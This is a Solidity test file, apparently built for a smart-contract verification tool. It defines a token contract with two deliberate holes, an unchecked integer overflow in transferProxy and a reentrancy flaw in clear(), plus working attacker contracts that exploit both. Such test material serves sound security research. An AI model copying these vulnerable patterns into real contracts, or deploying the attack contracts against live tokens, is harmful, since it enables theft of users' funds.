// SPDX-License-Identifier: MIT

/* Vulnerability examples:

   reentrancy:
   https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/

   integer overflow:
   https://peckshield.medium.com/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759
*/
pragma solidity >=0.8.0;

abstract contract Token {
    address public owner;
    uint256 public totalSupply;

    function balanceOf(
        address _owner
    ) public view virtual returns (uint256 balance);
}

/// @custom:tct invariant: forall x:address :: 0 <= balances[x] && balances[x] <= totalSupply
/// @custom:tct invariant: sum(balances) == totalSupply
abstract contract StandardToken is Token {
    function balanceOf(
        address _owner
    ) public view override returns (uint256 balance) {
        return balances[_owner];
    }

    mapping(address => uint256) balances;
}

contract MultiVulnToken is StandardToken {
    constructor(uint256 initialSupply) {
        totalSupply = initialSupply;
        balances[msg.sender] = totalSupply;
    }

    function transferProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _fee
    ) public returns (bool) {
        unchecked {
            require(balances[_from] >= _fee + _value);
            require(balances[_to] + _value >= balances[_to]);
            require(balances[msg.sender] + _fee >= balances[msg.sender]);

            balances[_to] += _value;
            balances[msg.sender] += _fee;
            balances[_from] -= _value + _fee;
            return true;
        }
    }

    //This function moves all tokens of msg.sender to the account of "_to"
    function clear(address _to) public {
        unchecked {
            uint256 bal = balances[msg.sender];
            balances[_to] += bal;
            bool success;
            (success, ) = msg.sender.call(
                abi.encodeWithSignature("receiveNotification(uint256)", bal)
            );
            require(success);
            balances[msg.sender] = 0;
        }
    }
}

//========================================================
contract reentrancy_attack {
    MultiVulnToken public multiVulnToken;
    address _to;
    uint count = 0;
    constructor(address _multiVulnTokenAddress, address __to) {
        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);
        _to = __to;
    }
    function receiveNotification(uint256) public {
        unchecked {	
		    if (count < 5) {
		        count++;
		        multiVulnToken.clear(_to);
		    }
		}
    }
    function attack() public {
        multiVulnToken.clear(_to);
    }
}
contract no_reentrancy_attack {
    MultiVulnToken public multiVulnToken;
    address _to;
    constructor(address _multiVulnTokenAddress, address __to) {
        multiVulnToken = MultiVulnToken(_multiVulnTokenAddress);
        _to = __to;
    }
    function receiveNotification(uint256) public {
        //nothing special
    }
    function call_clear() public {
        multiVulnToken.clear(_to);
    }
}

contract Submitter {
    MultiVulnToken public multiVulnToken;
    no_reentrancy_attack public benignUserAddress1;
    reentrancy_attack public attacker2Address1;
    address attacker1Address =
        address(0x92349Ef835BA7Ea6590C3947Db6A11EeE1a90cFd); //just an arbitrary address
    
    constructor () {
        multiVulnToken = new MultiVulnToken(1000);
        benignUserAddress1 = new no_reentrancy_attack(address(multiVulnToken),address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F));
        attacker2Address1 = new reentrancy_attack(address(multiVulnToken),address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F));
    }
    
    function attack1_int_overflow() public {
        multiVulnToken.transferProxy(
            address(this),
            attacker1Address,
            uint256(2 ** 255 + 1),
            uint256(2 ** 255)
        );
        revert();
    }
    
    function no_reentrancy() public {
        benignUserAddress1.call_clear();
        revert();
    }

    function attack2_reentrancy() public {
        attacker2Address1.attack();
        revert();
    }
}

contract Deployer {
    MultiVulnToken MultiVulnTokenContractAddress;

    reentrancy_attack attacker2Address1;
    address attacker2Address2 =
        address(0x0Ce8dAf9acbA5111C12B38420f848396eD71Cb3E); //just an arbitrary address
    no_reentrancy_attack benignUserAddress1;
    address benignUserAddress2 =
        address(0x71C7656EC7ab88b098defB751B7401B5f6d8976F); //just an arbitrary address

    constructor() {
        MultiVulnTokenContractAddress = new MultiVulnToken(1000);
        attacker2Address1 = new reentrancy_attack(address(MultiVulnTokenContractAddress),attacker2Address2);
        benignUserAddress1 = new no_reentrancy_attack(address(MultiVulnTokenContractAddress),benignUserAddress2);

        //suppose attacker2Address1 has 5 tokens initially
        MultiVulnTokenContractAddress.transferProxy(
            address(this),
            address(attacker2Address1),
            5,
            0
        );

        //suppose benignUserAddress has 5 tokens too
        MultiVulnTokenContractAddress.transferProxy(
            address(this),
            address(benignUserAddress1),
            5,
            0
        );
    }


    function getBalanceOfAttacker2() public view returns (uint256) {
        return
            MultiVulnTokenContractAddress.balanceOf(
                address(attacker2Address1)
            ) + MultiVulnTokenContractAddress.balanceOf(attacker2Address2);
    }

    function attack2_reentrancy() public {
        attacker2Address1.attack();
    }

    function getBenignUserBal() public view returns (uint256) {
        return
            MultiVulnTokenContractAddress.balanceOf(
                address(benignUserAddress1)
            ) +
            MultiVulnTokenContractAddress.balanceOf(
                address(benignUserAddress2)
            );
    }

    
}
